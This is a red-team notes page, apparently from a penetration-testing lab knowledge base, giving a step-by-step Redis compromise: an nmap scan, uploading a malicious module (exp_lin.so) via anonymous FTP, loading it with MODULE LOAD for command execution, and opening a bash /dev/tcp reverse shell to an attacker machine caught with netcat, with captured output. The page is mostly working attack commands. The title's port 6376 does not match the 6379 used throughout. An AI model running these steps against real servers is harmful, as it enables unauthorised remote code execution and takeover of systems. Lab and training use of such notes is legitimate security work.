---
title: 6376 Redis
parent: Services
grand_parent: Red Team
nav_order: 6376
---
# Redis


---

## Default Port

- 6376

---

## Service Info


---
## Common security issues

# [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)


---

## 1. Initial Scan

### redis-info
```zsh
nmap --script redis-info -sV -p 6379 192.168.120.93
```

```zsh
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.9 (64 bits)
| redis-info: 
|   Version: 5.0.9
|   Operating System: Linux 3.10.0-1127.19.1.el7.x86_64 x86_64
|   Architecture: 64 bits
|   Process ID: 902
|   Used CPU (sys): 13.524291
|   Used CPU (user): 12.019676
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 582.58K
|   Role: slave
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.45.159
```

👉 Check:

---

## 2. RCE

### Clone Repository
```zsh
git clone https://github.com/jas502n/Redis-RCE
```

```zsh
cd Redis-RCE
```
### upload MODULE
For example , use ftp.

```zsh
ftp 192.168.120.93
Connected to 192.168.120.93.
220 (vsFTPd 3.0.2)
Name (192.168.120.93:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

put exp_lin.so

```zsh
ftp> cd pub
250 Directory successfully changed.
ftp> put exp_lin.so 
local: exp_lin.so remote: exp_lin.so
229 Entering Extended Passive Mode (|||10100|).
150 Ok to send data.
100% |************************************************************************************************************************************************| 42680      228.72 KiB/s    00:00 ETA
226 Transfer complete.
42680 bytes sent in 00:00 (116.78 KiB/s)
```

### read MODULE

```zsh
redis-cli -h 192.168.120.93      
192.168.120.93:6379> INFO kyespaces
192.168.120.93:6379> MODULE LOAD /var/ftp/pub/exp_lin.so
OK
192.168.120.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

# Reverse Shell

```zsh
192.168.120.93:6379> system.exec "bash -i >& /dev/tcp/192.168.45.159/6379 0>&1"

rlwrap -cAr nc -lvnp 6379
listening on [any] 6379 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.120.93] 45526
bash: no job control in this shell
```

```zsh
[pablo@sybaris tmp]$ whoami
whoami
pablo
[pablo@sybaris tmp]$ id
id
uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
[pablo@sybaris tmp]$ 
```


👉 Next Privilege Escalation
- → [Linux Privilege Escalation](../04_privesc/linux.md)
- → [Windows Privilege Escalation](../04_privesc/windows.md)

---

